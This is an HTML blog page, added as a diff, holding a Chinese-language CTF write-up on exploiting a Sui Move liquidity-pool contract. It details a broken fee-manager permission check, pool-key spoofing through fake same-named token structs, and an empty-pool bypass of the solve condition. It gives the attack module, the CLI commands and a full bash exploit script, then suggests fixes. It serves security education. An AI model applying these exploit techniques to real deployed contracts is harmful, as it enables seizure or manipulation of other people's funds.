@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="DudeGuuud" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="&#34;the quieter you become, the more you are able to hear&#34;" />
+  
+  
+  
+  <title>
+    
+      SUI MOVE CTF 2025 (Swap) Write Up 
+      
+      
+      |
+    
+     Dude&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" />
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/rss.xml" title="Dude's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">DudeGuuud</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SUI MOVE CTF 2025 (Swap) Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-08-05 16:17:19
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+                <span class="span--category">
+                  <a href="/categories/Web3/" title="Web3">
+                    <b>#</b> Web3
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CTF/" title="CTF">
+                    #CTF
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Web3/" title="Web3">
+                    #Web3
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Sui-Move-CTF-Swap-Challenge-Writeup"><a href="#Sui-Move-CTF-Swap-Challenge-Writeup" class="headerlink" title="Sui Move CTF - Swap Challenge Writeup"></a>Sui Move CTF - Swap Challenge Writeup</h1><h2 id="挑战概述"><a href="#挑战概述" class="headerlink" title="挑战概述"></a>挑战概述</h2><p>这是一个Sui Move智能合约CTF挑战，目标是攻击一个流动性池合约，让合约中所有代币余额与累计手续费之和为零，从而获得Flag。</p>
+<h3 id="挑战信息"><a href="#挑战信息" class="headerlink" title="挑战信息"></a>挑战信息</h3><ul>
+<li><strong>Package ID</strong>: <code>0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a</code></li>
+<li><strong>部署交易</strong>: <code>2CDJQ1PTg4iE1JZPxmcZuxV2SqFgprMWhwkEA6x6hURM</code></li>
+<li><strong>Pools对象ID</strong>: <code>0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001</code></li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过分析合约代码，我发现了三个关键漏洞：</p>
+<h3 id="漏洞1-权限控制错误-Critical"><a href="#漏洞1-权限控制错误-Critical" class="headerlink" title="漏洞1: 权限控制错误 (Critical)"></a>漏洞1: 权限控制错误 (Critical)</h3><p><strong>位置</strong>: <code>set_fee_manager</code>函数 (第225行)</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">set_fee_manager</span><span class="token punctuation">(</span>pools<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Pools</span><span class="token punctuation">,</span> new_fee_manager<span class="token punctuation">:</span> address<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">==</span> new_fee_manager<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 错误的权限检查</span>
+    pools<span class="token punctuation">.</span>fee_manager <span class="token operator">=</span> new_fee_manager<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>问题</strong>: 检查的是调用者是否等于新的fee_manager，而不是检查调用者是否是当前的fee_manager。</p>
+<p><strong>影响</strong>: 任何人都可以将自己设置为fee_manager。</p>
+<h3 id="漏洞2-池子键值生成不安全-High"><a href="#漏洞2-池子键值生成不安全-High" class="headerlink" title="漏洞2: 池子键值生成不安全 (High)"></a>漏洞2: 池子键值生成不安全 (High)</h3><p><strong>位置</strong>: <code>get_struct</code>函数 (第149行)</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">fun get_struct<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> type_name <span class="token operator">=</span> <span class="token namespace">type_name<span class="token punctuation">::</span></span>get<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> address_part <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">get_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> module_part <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">get_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> full <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">borrow_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    type_name<span class="token punctuation">.</span><span class="token function">borrow_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>address_part <span class="token operator">+</span> module_part <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> full<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>问题</strong>: 只使用结构体名称生成池子键值，不包含完整的类型路径。</p>
+<p><strong>影响</strong>: 可以通过创建同名的假代币来混淆池子操作。</p>
+<h3 id="漏洞3-is-solved条件可被绕过"><a href="#漏洞3-is-solved条件可被绕过" class="headerlink" title="漏洞3: is_solved条件可被绕过"></a>漏洞3: is_solved条件可被绕过</h3><p><strong>位置</strong>: <code>is_solved</code>函数 (第246行)</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">is_solved</span><span class="token punctuation">(</span>pools<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Pools</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> sum <span class="token operator">=</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN1</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN2</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> 
+              get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN3</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN4</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> fee_sum <span class="token operator">=</span> get_total_fee<span class="token operator">&lt;</span><span class="token constant">TOKEN1</span><span class="token punctuation">,</span> <span class="token constant">TOKEN2</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_total_fee<span class="token operator">&lt;</span><span class="token constant">TOKEN3</span><span class="token punctuation">,</span> <span class="token constant">TOKEN4</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token macro property">assert!</span><span class="token punctuation">(</span>sum <span class="token operator">+</span> fee_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 发出Flag事件</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>问题</strong>: 如果创建空的池子，所有余额和手续费都为0，条件自然满足。</p>
+<h2 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h2><p>基于发现的漏洞，制定了以下攻击策略：</p>
+<ol>
+<li><strong>利用权限漏洞</strong>: 调用<code>set_fee_manager</code>将自己设置为fee_manager</li>
+<li><strong>创建假代币结构体</strong>: 利用键值生成漏洞，创建同名的假TOKEN结构体</li>
+<li><strong>创建空池子</strong>: 使用假代币创建空的池子，使余额和手续费都为0</li>
+<li><strong>触发Flag</strong>: 调用<code>is_solved</code>函数获得Flag</li>
+</ol>
+<h2 id="攻击实施"><a href="#攻击实施" class="headerlink" title="攻击实施"></a>攻击实施</h2><h3 id="步骤1-利用权限漏洞"><a href="#步骤1-利用权限漏洞" class="headerlink" title="步骤1: 利用权限漏洞"></a>步骤1: 利用权限漏洞</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a <span class="token punctuation">\</span>
+  <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> set_fee_manager <span class="token punctuation">\</span>
+  <span class="token parameter variable">--args</span> 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token punctuation">\</span>
+         0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe <span class="token punctuation">\</span>
+  --gas-budget <span class="token number">10000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>结果</strong>: 成功成为fee_manager</p>
+<h3 id="步骤2-部署攻击合约"><a href="#步骤2-部署攻击合约" class="headerlink" title="步骤2: 部署攻击合约"></a>步骤2: 部署攻击合约</h3><p>创建包含假TOKEN结构体的攻击合约：</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">exploit<span class="token punctuation">::</span></span>attack <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 创建假的TOKEN结构体，名称与原始代币相同</span>
+    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN1</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN2</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  
+    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN3</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    public <span class="token keyword">struct</span> <span class="token type-definition class-name">TOKEN4</span> has drop <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+    fun <span class="token function">init</span><span class="token punctuation">(</span>_ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 空的初始化函数</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>部署结果</strong>:</p>
+<ul>
+<li>攻击合约Package ID: <code>0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07</code></li>
+</ul>
+<h3 id="步骤3-创建假池子"><a href="#步骤3-创建假池子" class="headerlink" title="步骤3: 创建假池子"></a>步骤3: 创建假池子</h3><p>使用PTB (Programmable Transaction Block) 创建空的池子：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建TOKEN1-TOKEN2池子</span>
+sui client ptb <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token1 <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token2 <span class="token punctuation">\</span>
+  --move-call 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::create_pool <span class="token punctuation">\</span>
+    <span class="token string">"&lt;0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1,0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>"</span> <span class="token punctuation">\</span>
+    @0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token number">0</span> token1 token2 <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> pool_cap1 <span class="token punctuation">\</span>
+  --transfer-objects <span class="token string">"[pool_cap1]"</span> @0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe <span class="token punctuation">\</span>
+  --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>结果</strong>: 成功创建TOKEN1-TOKEN2池子，获得PoolCap</p>
+<p>类似地创建TOKEN3-TOKEN4池子。</p>
+<h3 id="步骤4-触发Flag"><a href="#步骤4-触发Flag" class="headerlink" title="步骤4: 触发Flag"></a>步骤4: 触发Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a <span class="token punctuation">\</span>
+  <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> is_solved <span class="token punctuation">\</span>
+  <span class="token parameter variable">--args</span> 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 <span class="token punctuation">\</span>
+  --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>结果</strong>: <strong>攻击成功！</strong></p>
+<h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><strong>成功交易哈希</strong>: <code>JYBCFLXdhzw1kNus4fVRwdvwYVrVQ29HP5Ut1xLXsQG</code></p>
+<p>在交易事件中可以看到Flag事件：</p>
+<pre class="line-numbers language-none"><code class="language-none">EventType: 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::Flag
+ParsedJSON:
+  ┌──────┬────────────────────────────────────────────────────────────────────┐
+  │ user │ 0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe │
+  └──────┴────────────────────────────────────────────────────────────────────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h2><h3 id="1-PTB语法的正确使用"><a href="#1-PTB语法的正确使用" class="headerlink" title="1. PTB语法的正确使用"></a>1. PTB语法的正确使用</h3><ul>
+<li>使用<code>--assign</code>来创建变量引用</li>
+<li>正确的对象ID引用格式: <code>@&lt;object_id&gt;</code></li>
+<li>类型参数格式: <code>&quot;&lt;package::module::Type&gt;&quot;</code></li>
+</ul>
+<h3 id="2-假代币结构体的关键作用"><a href="#2-假代币结构体的关键作用" class="headerlink" title="2. 假代币结构体的关键作用"></a>2. 假代币结构体的关键作用</h3><ul>
+<li>利用<code>get_struct</code>函数只检查结构体名称的漏洞</li>
+<li>创建同名但不同包的TOKEN结构体</li>
+<li>绕过类型系统检查</li>
+</ul>
+<h3 id="3-空池子的巧妙利用"><a href="#3-空池子的巧妙利用" class="headerlink" title="3. 空池子的巧妙利用"></a>3. 空池子的巧妙利用</h3><ul>
+<li>创建零余额的池子</li>
+<li>使所有<code>get_balance</code>和<code>get_total_fee</code>调用返回0</li>
+<li>满足<code>sum + fee_sum == 0</code>的条件</li>
+</ul>
+<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><ol>
+<li><p><strong>修复权限检查</strong>:</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">==</span> pools<span class="token punctuation">.</span>fee_manager<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p><strong>使用完整类型路径</strong>:</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">fun get_struct<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>
+    <span class="token namespace">type_name<span class="token punctuation">::</span></span>get<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">into_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 使用完整类型路径</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li><p><strong>增强is_solved检查</strong>:</p>
+<ul>
+<li>检查池子是否已正确初始化</li>
+<li>验证代币类型的合法性</li>
+<li>添加额外的安全检查</li>
+</ul>
+</li>
+</ol>
+<h2 id="完整攻击脚本"><a href="#完整攻击脚本" class="headerlink" title="完整攻击脚本"></a>完整攻击脚本</h2><p>为了方便复现，这里提供完整的攻击脚本：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token comment"># 完整的CTF攻击脚本</span>
+
+<span class="token assign-left variable">ATTACK_PACKAGE</span><span class="token operator">=</span><span class="token string">"0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07"</span>
+<span class="token assign-left variable">TARGET_PACKAGE</span><span class="token operator">=</span><span class="token string">"0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a"</span>
+<span class="token assign-left variable">POOLS_ID</span><span class="token operator">=</span><span class="token string">"0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001"</span>
+<span class="token assign-left variable">MY_ADDRESS</span><span class="token operator">=</span><span class="token string">"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Step 1: 利用权限漏洞成为fee_manager"</span>
+sui client call <span class="token parameter variable">--package</span> <span class="token variable">$TARGET_PACKAGE</span> <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> set_fee_manager <span class="token punctuation">\</span>
+  <span class="token parameter variable">--args</span> <span class="token variable">$POOLS_ID</span> <span class="token variable">$MY_ADDRESS</span> --gas-budget <span class="token number">10000000</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Step 2: 创建假TOKEN1-TOKEN2池子"</span>
+sui client ptb <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN1>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token1 <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN2>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token2 <span class="token punctuation">\</span>
+  --move-call <span class="token variable">$&#123;TARGET_PACKAGE&#125;</span>::pool::create_pool <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN1,<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN2>"</span> @<span class="token variable">$&#123;POOLS_ID&#125;</span> <span class="token number">0</span> token1 token2 <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> pool_cap1 <span class="token punctuation">\</span>
+  --transfer-objects <span class="token string">"[pool_cap1]"</span> @<span class="token variable">$&#123;MY_ADDRESS&#125;</span> <span class="token punctuation">\</span>
+  --gas-budget <span class="token number">20000000</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Step 3: 创建假TOKEN3-TOKEN4池子"</span>
+sui client ptb <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN3>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token3 <span class="token punctuation">\</span>
+  --move-call 0x2::coin::zero <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN4>"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> token4 <span class="token punctuation">\</span>
+  --move-call <span class="token variable">$&#123;TARGET_PACKAGE&#125;</span>::pool::create_pool <span class="token string">"&lt;<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN3,<span class="token variable">$&#123;ATTACK_PACKAGE&#125;</span>::attack::TOKEN4>"</span> @<span class="token variable">$&#123;POOLS_ID&#125;</span> <span class="token number">0</span> token3 token4 <span class="token punctuation">\</span>
+  <span class="token parameter variable">--assign</span> pool_cap2 <span class="token punctuation">\</span>
+  --transfer-objects <span class="token string">"[pool_cap2]"</span> @<span class="token variable">$&#123;MY_ADDRESS&#125;</span> <span class="token punctuation">\</span>
+  --gas-budget <span class="token number">20000000</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Step 4: 触发Flag"</span>
+sui client call <span class="token parameter variable">--package</span> <span class="token variable">$TARGET_PACKAGE</span> <span class="token parameter variable">--module</span> pool <span class="token parameter variable">--function</span> is_solved <span class="token punctuation">\</span>
+  <span class="token parameter variable">--args</span> <span class="token variable">$POOLS_ID</span> --gas-budget <span class="token number">20000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="学习要点"><a href="#学习要点" class="headerlink" title="学习要点"></a>学习要点</h2><h3 id="1-Sui-Move类型系统的理解"><a href="#1-Sui-Move类型系统的理解" class="headerlink" title="1. Sui Move类型系统的理解"></a>1. Sui Move类型系统的理解</h3><ul>
+<li>泛型类型参数的使用</li>
+<li>结构体的witness模式</li>
+<li>类型安全的重要性</li>
+</ul>
+<h3 id="2-PTB的强大功能"><a href="#2-PTB的强大功能" class="headerlink" title="2. PTB的强大功能"></a>2. PTB的强大功能</h3><ul>
+<li>可编程交易块允许复杂的操作组合</li>
+<li>正确的语法对攻击成功至关重要</li>
+<li>变量引用和对象传递</li>
+</ul>
+<h3 id="3-动态字段的工作原理"><a href="#3-动态字段的工作原理" class="headerlink" title="3. 动态字段的工作原理"></a>3. 动态字段的工作原理</h3><ul>
+<li>Sui的动态字段存储机制</li>
+<li>键值生成和查找过程</li>
+<li>类型擦除的安全隐患</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次攻击成功利用了Sui Move合约中的多个设计缺陷，特别是权限控制错误和类型系统的不当使用。通过创建假代币结构体和空池子，巧妙地绕过了安全检查，最终获得了Flag。</p>
+<p>关键成功因素：</p>
+<ol>
+<li><strong>深入的代码分析</strong> - 仔细阅读合约代码，发现多个漏洞</li>
+<li><strong>正确的攻击策略</strong> - 将多个漏洞组合使用</li>
+<li><strong>技术实现能力</strong> - 正确使用PTB和Sui CLI</li>
+<li><strong>持续的调试</strong> - 在遇到问题时不断调整方法</li>
+</ol>
+<p>这个案例展示了智能合约安全审计的重要性，特别是在权限管理和类型安全方面需要格外谨慎。对于开发者来说，这提醒我们要：</p>
+<ul>
+<li>仔细检查权限控制逻辑</li>
+<li>使用完整的类型标识符</li>
+<li>进行充分的安全测试</li>
+<li>考虑各种边界情况</li>
+</ul>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/08/05/MOVE%20CTF%202025/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-08-05 16:17:19
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web3/" title="Web3">
+                        <b>#</b> Web3
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
